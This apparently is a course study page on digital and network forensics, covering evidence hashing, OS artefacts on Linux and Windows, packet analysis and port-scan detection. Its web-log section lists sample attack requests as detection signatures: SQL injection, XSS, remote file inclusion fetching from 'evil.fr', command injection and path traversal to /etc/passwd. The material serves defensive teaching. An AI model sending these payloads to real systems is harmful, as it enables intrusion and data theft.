---
type: concept
title: "Digital Forensics — System and Network"
domain: cyber-security
status: established
created: 2026-11-02
updated: 2026-11-02
sources: [inf2005-csf-digital-forensics]
tags: [digital-forensics, evidence-integrity, hashing, os-forensics, windows-registry, event-log, linux, network-forensics, packet-analysis, wireshark, port-scan-detection, web-server-logs, inf2005]
related:
  - "[[concepts/cryptographic-hash-functions]]"
  - "[[concepts/network-security-attacks]]"
  - "[[concepts/network-security-defence]]"
  - "[[sources/inf2005-csf-digital-forensics]]"
---

# Digital Forensics — System and Network

**Forensics** is the application of science to legal problems and investigations. **Digital forensics** is the recovery and investigation of **digital evidence**: data stored or transmitted using a digital device. Its branches are computer, storage, network and mobile forensics.

> [!example] Maury Travis case (St Louis)
> A letter to a reporter carried a map from Expedia.com with an X marking a body. Expedia listed the IP addresses that had fetched that map around the postmark date; only one matched. The ISP linked the IP to a dial-up account and telephone number belonging to Maury Travis, whose home search found incriminating evidence. Logs at three organisations formed the trail.

## 1. Evidence

Typical evidence: e-mail, credit-card data, accounting files, notes, images, internet history, IP addresses, logs and malware. Sources include laptops, desktops, tablets, consoles, smartphones, network and server infrastructure, the cloud, transit cards and cameras.

## 2. Evidence integrity

The collected evidence must be demonstrably the evidence that is analysed and presented. A **hash function** gives a fingerprint of documents, source code or a whole drive at collection time; recomputing it later and matching proves no tampering. The progression on the slide is **MD5 → SHA-1/2 → SHA-256**, because MD5 and SHA-1 are broken (see [[concepts/cryptographic-hash-functions]]).

**Collisions** (the slide's question): use a collision-resistant algorithm such as SHA-256, and optionally record two independent hashes so that an attacker would need simultaneous collisions. This answer is an addition; the slide only poses the question.

## 3. Process model

There is no single standard model. Mark M. Pollitt's, based on legal requirements:

1. **Acquisition** of evidence in a lawful manner
2. **Identification** of the data usable as evidence, and collection
3. **Evaluation** of relevance to the case and whether it can be used
4. **Admission** of the evidence in court

**Preservation of evidence** runs through all four stages.

## 4. System (computer) forensics

Carrier's layered analysis model: physical storage media → volume → file system → application analysis, with memory, swap space, database and network analysis alongside. Three guiding questions: why is the OS relevant, which artefacts are useful, and where are they?

The OS-level view follows the boot timeline (OS loading → initialisation → user authentication → user sessions) across **ROM** (boot loader), **RAM** (volatile: kernel structures, processes, libraries) and **persistent storage** (kernel and service executables, configuration, logs, temporary files). Every event results from a user (real or bot) acting or failing to act, so forensics correlates system changes with user actions.

**Artefacts of interest:** file download, program execution, file opening or creation, deleted files, physical device location, USB or drive storage, account usage, network usage.

### Linux

- No registry, so evidence is scattered; mostly plain text, which suits string searching.
- No file creation dates until ext4; metadata updates when files are deleted.
- `/etc/passwd` (users; UID 0 has admin rights), `/etc/shadow` (password hashes, attackable with John the Ripper), `/etc/group`, `/etc/sudoers`, `/etc/inittab`, `/var/spool/cron/*`.
- Logs: `/var/log/boot.log`, `/var/log/auth.log`, `/var/log/secure`, `/var/log/audit/audit.log`; login history in `/var/log/wtmp`, read with the `last` command (user, source, time, duration).

### Windows

- **Registry:** a unified, hierarchical store. Hives are the root directories, keys the subfolders, values the files (types such as `REG_SZ`, `REG_DWORD`). It holds configuration, usernames, browser activity, files opened and programs executed.
- **Event logs:** successful and failed logons in `%SystemRoot%\System32\winevt\logs\Security.evtx`. Last login time and password-change time are under `SAM\Domains\Account\Users`.
- Other sources: link files, Recycle Bin, browser history and cache, **prefetch files** (`C:\Windows\Prefetch`), and application metadata (for example Office: last ten authors, revisions with track changes, hidden comments, created/written/accessed times).

## 5. Network forensics

### Evidence by device

| Device | Evidence |
|--------|----------|
| Wireless access point | Easy to eavesdrop; management traffic often unencrypted |
| Switch | Port-to-MAC mapping table; traffic can be captured |
| Router | Port-to-network mapping; packet filtering |
| DHCP server | Lease logs: IP-to-MAC mappings |
| AAA server | Successful and failed logins in its domain |
| NIDS/NIPS | Attacks in progress, with tunable detail |
| Firewall | Session logs |
| Web proxy | Browsing logs for the whole organisation |

### Web server logs

Logs at application, web server and database level reveal **attack signatures** in the request line:

| Attack | Pattern |
|--------|---------|
| SQL injection | `/product.asp?id=0%20or%201=1` |
| XSS | `/forum.php?post=<script>alert(1);` |
| Remote file inclusion | `/include/?file=http://evil.fr/sh` |
| Command execution | `/lookup.jsp?ip=\|+ls+-l` |
| Buffer overflow | `/cgi-bin/Count.cgi?user=a\x90\xbf8\xee\xff` |

In the worked excerpt, five requests fetch ordinary pages (`page=news`, `blog`, `index`, `wiki`), while `GET /webapp.php?page=../../etc/passwd` from 212.32.45.167 returned 200 with 2,219 bytes: a **path-traversal** request that succeeded. The pattern, not any single request, indicates the attack.

### Network traces and sniffing

A **network trace** is a linearised bit copy of captured traffic, used for detecting attacks (scans, DoS), reverse-engineering protocols (botnet chatter), inspecting communications and carving files, and detecting payload patterns (website fingerprinting, Tor).

Sniffer placement: **(A)** on a hub, **(B)** on a switch **SPAN port**, or **(C)** a **network tap** on the switch's ingress link.

### Packet analysis

Tools: Wireshark, tshark, ngrep. Techniques: **parsing protocol fields**, **packet filtering** by field values, and **pattern matching** (keyword search). The worked example is a Wireshark frame of an HTTP `GET` sent through a proxy (destination port 3128), where the headers expose Host, User-Agent and language preferences.

### Port-scan detection

Look for TCP packets with only the **SYN** flag (`S`) set, sent in bulk:

| Scan | Pattern in the trace |
|------|----------------------|
| **Vertical** | One source, many destination ports on **one host** (holmes → watson: ports 220, ftp, telnet, 22, 110, …) |
| **Horizontal** | One source, **one port** (80) across many hosts (foo.example.com → 192.168.77.27–34) |

TCP flag values for reference: CWR 0x80, ECE 0x40, URG 0x20, ACK 0x10, PSH 0x08, RST 0x04, SYN 0x02, FIN 0x01.

These traces are what a NIDS from [[concepts/network-security-defence]] uses to raise a scan alert, and what an attacker generates with nmap in [[concepts/network-security-attacks]].
